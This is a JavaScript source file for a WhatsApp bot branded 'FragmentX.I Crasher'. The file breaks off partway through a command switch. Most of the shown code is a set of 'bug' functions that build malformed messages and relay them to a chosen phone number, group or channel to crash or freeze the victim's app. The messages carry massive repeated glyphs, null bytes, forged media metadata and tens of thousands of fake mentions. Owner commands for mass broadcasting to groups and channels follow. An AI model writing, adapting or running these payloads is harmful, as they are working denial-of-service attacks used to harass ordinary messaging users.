const crypto = require("crypto")

module.exports = async (Joo, m, store) => {
try {
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ""
	
const budy = (typeof m.text == 'string' ? m.text : '') 
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
const makeid = crypto.randomBytes(3).toString('hex')
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const botNumber = await Joo.decodeJid(Joo.user.id)
const isOwner = m.sender.split("@")[0] == global.owner ? true : m.fromMe ? true : false
const pushname = m.pushName || `${m.sender.split("@")[0]}`
const isBot = botNumber.includes(m.sender)
const Premium = JSON.parse(fs.readFileSync('./data/murbug.json'))
const isPremium = Premium.includes(m.sender)
const { runtime, getRandom, getTime, tanggal, toRupiah, telegraPh, pinterest, ucapan, generateProfilePicture, getBuffer, fetchJson, resize, sleep } = require('./system/function.js')

m.isGroup = m.chat.endsWith("g.us")
m.metadata = m.isGroup ? (await Joo.groupMetadata(m.chat).catch(_ => {}) || {}) : {}
m.isAdmin = m.metadata && m.metadata.participants ? (m.metadata.participants.find(e => e.admin !== null && e.id == m.sender) || false) : false
m.isBotAdmin = m.metadata && m.metadata.participants ? (m.metadata.participants.find(e => e.admin !== null && e.id == botNumber) || false) : false

const qchannel = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {
newsletterAdminInviteMessage: {newsletterJid: `120363224727395@newsletter`, newsletterName: `𝗙𝗿𝗮𝗴𝗺𝗲𝗻𝘁𝗫.𝗜`, jpegThumbnail: "", caption: `𝗙𝗿𝗮𝗴𝗺𝗲𝗻𝘁 𝗖𝗿𝗮𝘀𝗵𝗲𝗿`, inviteExpiration: 0 }}}

const x = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnailUrl: "https://img12.pixhost.to/images/1321/582178721_joocloud.jpg",
      itemCount: "999999",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["13135550002@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const reply = (bokep) => { 
    Joo.sendMessage(m.chat, {
        'text': bokep,
        'contextInfo': {
            'mentionedJid': [m.sender], 
            'forwardingScore': 0x98967f,
            'isForwarded': true,
            'externalAdReply': {
                'showAdAttribution': true,
                'containsAutoReply': true,
                'title': "𝗙𝗿𝗮gment V1",
                'body': `FragmentX.I Crasher`,
                'previewType': "PHOTO",
                'thumbnailUrl': 'https://files.catbox.moe/nx4kzt.jpg',
                'sourceUrl': 'https://whatsapp.com/channel/0029VbA8EL0DjiOguK9AA30X'
            }
        }
    }, {
        'quoted': qchannel // Mengutip pesan sebelumnya
    });
};

// #- Function Bug
async function Systemjoo(Joo, targetNumber) {
    let Thumb = "https://img12.pixhost.to/images/1522/585493219_joocloud.jpg";
    function repeatText(text, times) {
        return text.repeat(times);
    }

    let repeatedText = repeatText("ꦿꦾ꧀ৃৃৃ⃟⃟⃟⃟⃟", 9999);
   
    let repeatedTitle = repeatText("ꦽ", 9999);

    let mgmenu = await prepareWAMessageMedia(
        { image: { url: Thumb } }, 
        { upload: Joo.waUploadToServer }
    );

    const msgii = await generateWAMessageFromContent(targetNumber, {
        viewOnceMessageV2Extension: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `FragmentX.I Kill You🐱                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ${repeatedText} ${repeatedTitle} ${repeatedText}`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: [{
                            body: proto.Message.InteractiveMessage.Body.fromObject({}),
                            footer: proto.Message.InteractiveMessage.Footer.fromObject({
                                text: "Hello?"
                            }),
                            header: proto.Message.InteractiveMessage.Header.fromObject({
                                title: `${repeatedTitle}`,
                                hasMediaAttachment: true, 
                                ...mgmenu
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                buttons: [
                                    {
                                        "name": "quick_reply",
                                        "buttonParamsJson": `{\"display_text\":\"${repeatText("ꦽ", 200)}\",\"id\":\".tes\"}`
                                    },
                                    {
                                        "name": "quick_reply",
                                        "buttonParamsJson": `{\"display_text\":\"${repeatText("ꦽ", 200)}\",\"id\":\".tes\"}`
                                    },
                                    {
                                        "name": "cta_url",
                                        "buttonParamsJson": `{\"display_text\":\"${repeatText("ꦽ", 500)}\",\"url\":\"https://whatsapp.com/channel/0029VbA8EL0DjiOguK9AA30X\",\"merchant_url\":\"https://www.google.com\"}`
                                    }
                                ]
                            })
                        }]
                    })
                })
            }
        }
    }, { userJid: targetNumber, quoted: null });

    await Joo.relayMessage(targetNumber, msgii.message, { messageId: msgii.key.id });
}        

async function carousel(Joo, isTarget) {
  let haxxn = 10;

  for (let i = 0; i < haxxn; i++) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 5; i++) {
      buttt.push({
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
          "header": "null",
          "body": "xxx",
          "flow_action": "navigate",
          "flow_action_payload": { screen: "FORM_SCREEN" },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 1000; i++) {
      push.push({
        "body": {
          "text": "\u0000\u0000\u0000\u0000\u0000"
        },
        "footer": {
          "text": ""
        },
        "header": {
          "title": 'Fragment Ni Kak🐣 ϟ\u0000\u0000\u0000\u0000',
          "hasMediaAttachment": true,
          "imageMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            "mimetype": "image/jpeg",
            "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            "fileLength": "591",
            "height": 0,
            "width": 0,
            "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            "mediaKeyTimestamp": "1721344123",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
            "scanLengths": [
              247,
              201,
              73,
              63
            ],
            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        "nativeFlowMessage": {
          "buttons": []
        }
      });
    }

    const carousel = generateWAMessageFromContent(isTarget, {
      "viewOnceMessage": {
        "message": {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          "interactiveMessage": {
            "body": {
              "text": "\u0000\u0000\u0000\u0000"
            },
            "footer": {
              "text": "( 🐉 ) King Fragment Is Here ( 🐉 )"
            },
            "header": {
              "hasMediaAttachment": false
            },
            "carouselMessage": {
              "cards": [
                ...push
              ]
            }
          }
        }
      }
    }, {});

    await Joo.relayMessage(isTarget, carousel.message, {
      messageId: carousel.key.id
    });
  }
}

async function Systemjoov2(Joo, targetNumber) {
    const Thumb = "https://img12.pixhost.to/images/1522/585493219_joocloud.jpg";

    const repeat = (txt, count) => txt.repeat(count);
    const zalgo = repeat("H̵͚͐e̵͓͐ḻ̷͗l̵̡͠ö̶̳́", 500);
    const glitched = repeat("ꦿꦾ꧀ৃ⃟⃟⃟️️️️️", 2000);
    const zeroWidth = repeat("\u200B\u200C\u200D\u2060\uFEFF", 3000);
    const title = repeat("ꦿꦾ꧀ৃ⃟⃟⃟️️ᎰᏒᎯᎶᎷᏯᏁᎿ", 100);
    const caption = `FragmentX.I - Delay Invis \n\n${glitched}${zalgo}${zeroWidth}${title}${glitched}`;

    let mgmenu = await prepareWAMessageMedia(
        { image: { url: Thumb } }, 
        { upload: Joo.waUploadToServer }
    );

    const msgii = await generateWAMessageFromContent(targetNumber, {
        viewOnceMessageV2Extension: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: caption
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: Array.from({ length: 10 }, () => ({
                            body: proto.Message.InteractiveMessage.Body.fromObject({ text: glitched }),
                            footer: proto.Message.InteractiveMessage.Footer.fromObject({
                                text: title
                            }),
                            header: proto.Message.InteractiveMessage.Header.fromObject({
                                title: repeat("ꦿ", 300),
                                hasMediaAttachment: true,
                                ...mgmenu
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                buttons: Array.from({ length: 3 }, (_, i) => ({
                                    name: "quick_reply",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: repeat("꧁𝕶𝖎𝖑𝖑 𝕸𝖊꧂", 200),
                                        id: `.tes${i}`
                                    })
                                }))
                            })
                        }))
                    })
                })
            }
        }
    }, { userJid: targetNumber });

    await Joo.relayMessage(targetNumber, msgii.message, { messageId: msgii.key.id });
}

async function CrashJids(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
              order: {
                status: "completed",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: {}
      }
   }
  }, { userJid: target });

  await Joo.relayMessage(target, msg.message, { 
    messageId: msg.key.id 
  });
}

async function trashinfinity(target) {
 let virtex = "Call Me🐣";
   Joo.relayMessage(target, {
     groupMentionedMessage: {
       message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "99999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "FragmentX.I V1" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝗨𝗜 𝗦𝗶𝘀𝘁𝗲𝗺 𝗕𝘆 FragmentX.I" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
        
async function VPen(zLoc, ptcp = false) {
    let valhalla = "Halo Ini Fragment" + "ꦾ".repeat(50000);

    let mentionedJidArray = Array.from({ length: 35000 }, () => 
        "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    );

    let battanz = {
        groupMentionedMessage: {
            message: {
                listResponseMessage: {
                    title: " @120363326274964194@g.us",
                    listType: "SINGLE_SELECT",
                    singleSelectReply: {
                        selectedRowId: "Gateway To Hell"
                    },
                    description: " @120363326274964194@g.us",
                    contextInfo: {
                        mentionedJid: mentionedJidArray,
                        groupMentions: [{ 
                            groupJid: "120363326274964194@g.us", 
                            groupSubject: valhalla 
                        }]
                    }
                }
            }
        }
    };

    await Joo.relayMessage(zLoc, battanz, { participant: { jid: zLoc } }, { messageId: null });
}

async function Crashed(target) {
Joo.relayMessage(
target,
{
interactiveMessage: {
header: {
title: "⃟🩸 FragmentX.I 🦠⃟   ",
hasMediaAttachment: false
},
body: {
text: "\nꦾ".repeat(155555)
},
nativeFlowMessage: {
messageParamsJson: "",
buttons: [{
name: "single_select",
buttonParamsJson: "z"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},

]
}
}						
},
{ participant: { jid: target } }
);
}

async function protocolbug(isTarget, mention = []) {
    const delaymention = Array.from({ length: 9741 }, (_, r) => ({
        title: "᭯".repeat(9741),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "𝑱𝒐𝒐𝑪𝒍𝒐𝒖𝒅𝑰𝑫 - 𝑺𝒐𝒍𝒐 ッ",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🌀" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "9741@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "( # )"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(isTarget, MSG, {});

    await Joo.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention.length > 0) {
        await Joo.relayMessage(
            isTarget,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "𝑱𝒐𝒐𝑪𝒍𝒐𝒖𝒅𝑰𝑫 - 𝑺𝒐𝒍𝒐 ッ" },
                        content: undefined
                    }
                ]
            }
        );
    }
}


async function AnakKucai(target, Ptcp = true) {
  try {
    await Joo.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: -999.03499999999999,
                  degreesLongitude: 999.03499999999999,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "— FragmentX.I\n" + "ꦾ".repeat(30000) +
                  "\u0000".repeat(10000) +
                  "@22222".repeat(20000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [target],
                groupMentions: [
                  {
                    groupJid: "0@newsletter",
                    groupSubject: "SiJomokKenapaJirr",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}

const example = async (teks) => {
const commander = ` *Contoh Command :*\n*${cmd}* ${teks}`
return reply(commander)
}

const capital = (string) => {
return string.charAt(0).toUpperCase() + string.slice(1);
}

if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), chalk.blue.bold(`[ PESAN ]`), chalk.blue.bold(`FROM`), chalk.blue.bold(`${m.sender.split("@")[0]}`), chalk.blue.bold(`TEXT :`), chalk.blue.bold(`${cmd}`))
}

switch (command) {
case "menu":
case "joo": {
  const anjay = `𖤐 *𝖥𝗋𝖺𝗀𝗆𝖾𝗇𝗍𝖷.𝖨 - 𝖠𝗎𝗍𝗼𝗆𝖺𝗍𝖾𝖽 𝖠𝗌𝗌𝗂𝗌𝗍𝖺𝗇𝗍 𝖮𝖿 𝖣𝖺𝗋𝗄 𝖢𝗈𝖽𝖾*
*𝖧𝖺𝗅𝗈, 𝗌𝖺𝗒𝖺 𝖺𝖽𝖺𝗅𝖺𝗁 𝖲𝖼𝗋𝗂𝗉𝗍 𝖥𝗋𝖺𝗀𝗆𝖾𝗇𝗍𝖷.𝖨, 𝖽𝗂𝗋𝖺𝗇𝖼𝖺𝗇𝗀 𝗈𝗅𝖾𝗁 𝖩𝗈𝗈 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 𝗎𝗇𝗍𝗎𝗄 𝗆𝖾𝗇𝗃𝖺𝖽𝗂 𝖺𝗌𝗂𝗌𝗍𝖾𝗇 𝗄𝖾𝗌𝖾𝗍𝗂𝖺*

*[ ♢ ] 𝖨𝖭𝖥𝖮 𝖡𝖮𝖳*
▸ *𝖭𝖺𝗆𝖾:* 𝖥𝗋𝖺𝗀𝗆𝖾𝗇𝗍𝖷.𝖨  
▸ *𝖢𝗋𝖾𝖺𝗍𝗈𝗋:* 𝖩𝗈𝗈  
▸ *𝖵𝖾𝗋𝗌𝗂:* 1.0  
▸ *𝖲𝖼𝗋𝗂𝗉𝗍 𝖳𝗒𝗉𝖾:* 𝖢𝖺𝗌𝖾`;

  let buttonMessage = {
    image: { url: "https://files.catbox.moe/nx4kzt.jpg" },
    gifPlayback: true,
    caption: anjay,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        title: "FragmentX.I",
        body: "© ᴊᴏᴏ ᴅᴇᴠᴇʟᴏᴘᴇ𝗋",
        thumbnailUrl: "https://files.catbox.moe/bzyjjy.jpg",
        sourceUrl: "https://whatsapp.com/channel/0029VbA8EL0DjiOguK9AA30X",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    },
    footer: "ғʀᴀɢᴍᴇɴᴛx.ɪ ᴠ𝟷",
    headerType: 6, // masih bisa dipakai
    buttons: [
      {
        buttonId: ".sc",
        buttonText: { displayText: "𝖲𝖼𝗋𝗂𝗉𝗍" },
        type: 1,
      },
      {
        buttonId: ".owner",
        buttonText: { displayText: "𝖮𝗐𝗇𝖾𝗋" },
        type: 1,
      },
      {
        buttonId: "action",
        buttonText: { displayText: "𝖢𝗁𝗈𝗈𝗌𝖾 𝖬𝖾𝗇𝗎" },
        type: 4,
        nativeFlowInfo: {
          name: "single_select",
          paramsJson: JSON.stringify({
            title: "𝖲𝖾𝗅𝖾𝖼𝗍 𝖬𝖾𝗇𝗎",
            sections: [
              {
                title: "𝖲𝖾𝗅𝖾𝖼𝗍 𝖬𝖾𝗇𝗎",
                highlight_label: "ᴄʀᴇᴀᴛᴇᴅ ʙʏ ᴊᴏᴏᴄʟᴏᴜᴅ",
                rows: [
                  { header: "", title: "Show All Menu", description: "", id: ".allmenu" },
                  { header: "", title: "Show Bug 𝗠𝗲𝗻𝘂", description: "", id: ".bugmenu" }
                ]
              }
            ]
          })
        }
      }
    ]
  };

  await Joo.sendMessage(m.chat, buttonMessage, { quoted: x });
  await Joo.sendMessage(
    m.chat,
    {
      audio: fs.readFileSync("./sound.mp3"),
      mimetype: "audio/mpeg",
      ptt: true
    },
    { quoted: qchannel }
  );
}
break;
case "bugmenu": { 
    const anjay4 = `
╭─[ \`𝗕𝘂𝗴 𝗠𝗲𝗻𝘂\` ]
│ ✰ x-ɪɴᴠɪs - 62
│ ✰ ᴘᴀʏʟᴏᴀᴅ - 62
│ ✰ ᴄᴀʀᴏᴜsᴇʟ - 62
│ ✰ ᴅᴇʟᴀʏ-ᴠ𝟷 - 62 
│ ✰ ᴄʀᴀsʜ-ɢʙ - Link Grup 
│ ✰ ᴋɪʟʟ-ᴄʜ - Id Channel
╰──────✧
 `;
try {
        const thumbImage = fs.existsSync("./Fragment.jpg") ? fs.readFileSync("./Fragment.jpg") : null;

        const messageContent = {
            document: { url: "https://files.catbox.moe/bzyjjy.jpg" },
            mimetype: "image/png",
            fileName: `FragmentX.I Crasher`,
            fileLength: 999999999999999,
            pageCount: 99999,
            jpegThumbnail: thumbImage ? await resize(thumbImage, 400, 400) : null,
            caption: anjay4,
            footer: "© ᴊᴏᴏᴄʟᴏᴜᴅ ᴅᴇᴠᴇʟᴏᴘᴇʀ",
            contextInfo: {
                forwardingScore: 99999,
                externalAdReply: {
                    body: `© ᴊᴏᴏ ᴅᴇᴠᴇʟᴏᴘᴇʀ`,
                    containsAutoReply: true,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    showAdAttribution: true,
                    sourceUrl: "https://whatsapp.com/channel/0029VbA8EL0DjiOguK9AA30X",
                    thumbnail: thumbImage,
                    thumbnailUrl: "https://files.catbox.moe/bzyjjy.jpg",
                    title: "FragmentX.I V1",
                },
            },
            viewOnce: true,
        };

        // Kirim pesan utama
        await Joo.sendMessage(m.chat, messageContent, { quoted: x });

        // Kirim audio sebagai voice note
        await Joo.sendMessage(
            m.chat,
            {
                audio: { url: "https://files.catbox.moe/mfcba3.mp3" },
                mimetype: "audio/mpeg",
                ptt: true,
            },
            { quoted: qchannel }
        );

    } catch (error) {
        console.error("Error sending menu:", error);
        await Joo.sendMessage(m.chat, { text: "⚠️ Terjadi kesalahan saat mengirim menu." });
    }
}
break;
case "allmenu": {
  const anjay1 = `
╭─[ \`𝗕𝘂𝗴 𝗠𝗲𝗻𝘂\` ]
│ ✰ x-ɪɴᴠɪs - 62
│ ✰ ᴘᴀʏʟᴏᴀᴅ - 62
│ ✰ ᴄᴀʀᴏᴜsᴇʟ - 62
│ ✰ ᴅᴇʟᴀʏ-ᴠ𝟷 - 62 
│ ✰ ᴄʀᴀsʜ-ɢʙ - Link Grup 
│ ✰ ᴋɪʟʟ-ᴄʜ - Id Channel
╰──────✧
╭─[ \`𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂\` ]
│ ✰ ᴊᴘᴍ
│ ✰ ᴊᴘᴍᴄʜғᴏᴛᴏ
│ ✰ ᴘʟᴀʏ
│ ✰ ᴛᴏᴜʀʟ
│ ✰ ʙʀᴀᴛ
│ ✰ ʀᴠᴏ
│ ✰ ᴀᴅᴅʙᴜʏʏᴇʀ
│ ✰ ʀᴇᴋᴀᴘʙᴜʏʏᴇʀ
│ ✰ ᴋᴀʟᴋᴜʟᴀᴛᴏʀ
│ ✰ ᴀᴅᴅᴘʀᴇᴍ
│ ✰ ᴅᴇʟᴘʀᴇᴍ
│ ✰ ʟɪsᴛᴘʀᴇᴍ
╰──────✧`;
let buttons = [
      { buttonId: ".owner", buttonText: { displayText: "𝖮𝗐𝗇𝖾𝗋" } }, 
      { buttonId: ".menu", buttonText: { displayText: "𝖡𝖺𝖼𝗄 𝖳𝗈 𝖬𝖾𝗇𝗎" } }
];

    let buttonMessage = {
        image: { url: `https://files.catbox.moe/nx4kzt.jpg` },
	    caption: anjay1,
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
             title: `FragmentX.I`,
              body: `© ᴊᴏᴏ ᴅᴇᴠᴇʟᴏᴘᴇʀ`,
             thumbnailUrl: `https://files.catbox.moe/bzyjjy.jpg`,
            sourceUrl: `https://whatsapp.com/channel/0029VbA8EL0DjiOguK9AA30X`,
           mediaType: 1,
          renderLargerThumbnail: true
         }
        },
        footer: "© FragmentX.I V1",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };

    await Joo.sendMessage(m.chat, buttonMessage, { quoted: x });      
     await Joo.sendMessage(m.chat, {audio: fs.readFileSync('./sound.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: qchannel})
                }
break
case "jpm": {
    if (!isOwner) return reply(`❌ Tidak memiliki akses!`);

    if (!q) return reply(`📌 Contoh: .jpm Halo semua!`);

    let allgrup = await Joo.groupFetchAllParticipating();
    let res = Object.keys(allgrup); // Mendapatkan daftar ID grup
    let count = 0;
    let failed = 0;
    const teks = text;

    await reply(`⏳ Memproses *JPM* ke ${res.length} grup...`);

    for (let i of res) {
        try {
            await Joo.sendMessage(i, { text: teks }, { quoted: x });
            count++;
        } catch (error) {
            failed++;
        }
        await sleep(1000); // Delay agar tidak spam berlebihan
    }

    await Joo.sendMessage(m.chat, {
        text: `✅ *JPM Selesai!*\n📬 Berhasil dikirim ke: ${count} grup\n⚠️ Gagal dikirim: ${failed} grup`,
        quoted: x,
    });
}
break;

case "jpmchfoto": {
    if (!isOwner) return reply(`no acces`);
    if (!text) return reply("Balas/kirim foto dengan teks");
    if (!/image/.test(mime)) return reply("Format salah! Balas/kirim foto dengan teks.");
    
    let image = await Joo.downloadAndSaveMediaMessage(qmsg);
    const daftarSaluran = [
        "120363417288913995@newsletter",
  "120363409054020546@newsletter",      
  "120363397310216995@newsletter",      "120363410461688964@newsletter",
        "120363418281557557@newsletter",
        "120363405248990744@newsletter",
    ];
    let total = 0;

    reply(`Memproses Mengirim Pesan Teks & Foto Ke ${daftarSaluran.length} Saluran...`);
    
    for (const idSaluran of daftarSaluran) {
        try {
            await Joo.sendMessage(idSaluran, {
                image: await fs.readFileSync(image),
                caption: text,
                contextInfo: { forwardingScore: 1, isForwarded: true },
            });
            total++;
        } catch (err) {
            console.error(`Gagal mengirim ke saluran ${idSaluran}:`, err);
        }
        await sleep(1000); // Delay antara pesan
    }

    await fs.unlinkSync(image);
    reply(`Berhasil Mengirim Pesan Ke ${total} Saluran`);
}
break;
case "play":{
